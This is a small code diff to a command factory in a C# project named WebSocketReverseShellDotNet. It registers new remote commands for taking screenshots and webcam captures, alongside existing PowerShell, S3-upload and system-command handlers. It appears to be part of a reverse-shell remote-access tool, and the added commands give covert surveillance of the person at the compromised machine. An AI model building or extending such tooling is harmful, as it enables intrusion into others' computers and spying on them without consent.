@@ -25,6 +25,8 @@ namespace WebSocketReverseShellDotNet.service.factory
                 commandsList.Add("powershell", new TogglePowerShellCommand());
             }
             commandsList.Add("upload", new UploadToS3());
+            commandsList.Add("/screenshot", new ScreenShot());
+            commandsList.Add("/camerashot", new CameraScreenShot());
             commandsList.Add("/??", new HelpCommand());
             commandsList.Add("/exit", new Terminate());
             // If not found, redirect to the system command
